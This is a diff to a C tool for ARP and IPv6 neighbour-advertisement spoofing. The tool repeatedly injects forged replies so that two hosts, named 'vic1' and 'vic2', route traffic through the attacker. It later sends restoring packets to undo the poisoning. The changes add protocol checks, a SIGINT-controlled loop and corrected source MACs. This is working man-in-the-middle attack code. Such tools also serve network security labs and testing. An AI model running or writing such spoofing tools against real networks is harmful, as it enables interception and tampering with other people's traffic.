@@ -93,12 +93,19 @@ int parseArgs(int argc, char* argv[], clargs_t *clargs){
 		}
 	}
 
+	if(strcmp(clargs->protocol,"arp")==0 && arg_ip_type==ARG_IPV6_TYPE){
+		return 1;
+	}
+	else if(strcmp(clargs->protocol,"ndp")==0 && arg_ip_type==ARG_IPV4_TYPE){
+		return 1;
+	}
+
 	return 0;
 }
 
 void spoof(iface_t iface, clargs_t clargs){
 	
-	while(true){
+	while(!sigint_recv){
 		if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
 			uint8_t pkt1[PKT_ARP_LEN];
 			arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
@@ -117,7 +124,6 @@ void spoof(iface_t iface, clargs_t clargs){
 			pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
 		}
 
-		if(sigint_recv){break;}
 		usleep(clargs.interval_ms*1000);
 	}
 
@@ -130,6 +136,12 @@ void unspoof(iface_t iface, clargs_t clargs){
 		arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,clargs.vic2_mac,clargs.vic1_mac,ARP_OP_REPLY);
 		uint8_t pkt2[PKT_ARP_LEN];
 		arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,clargs.vic1_mac,clargs.vic2_mac,ARP_OP_REPLY);
+		//src mac in eth header is real physical mac
+		ethhdr_t* h1 = (ethhdr_t*)pkt1;
+		ethhdr_t* h2 = (ethhdr_t*)pkt2;
+		memcpy(h1->src_mac,iface.mac,MAC_LEN);
+		memcpy(h2->src_mac,iface.mac,MAC_LEN);
+		//------------------------------------------
 		pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
 		pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
 	}
@@ -138,6 +150,12 @@ void unspoof(iface_t iface, clargs_t clargs){
 		icmpv6_pkt_advert_build(pkt1,clargs.vic1_mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
 		uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
 		icmpv6_pkt_advert_build(pkt2,clargs.vic2_mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
+		//src mac in eth header is real physical mac
+		ethhdr_t* h1 = (ethhdr_t*)pkt1;
+		ethhdr_t* h2 = (ethhdr_t*)pkt2;
+		memcpy(h1->src_mac,iface.mac,MAC_LEN);
+		memcpy(h2->src_mac,iface.mac,MAC_LEN);
+		//------------------------------------------
 		pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
 		pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
 	}
@@ -163,6 +181,7 @@ int main(int argc, char* argv[]){
 	pcap_activate(iface.handle);
 
 	spoof(iface,clargs);
+	sleep(1); //wait befor unspoof, otherwise it might not work
 	unspoof(iface,clargs);
 
 	pcap_close(iface.handle);
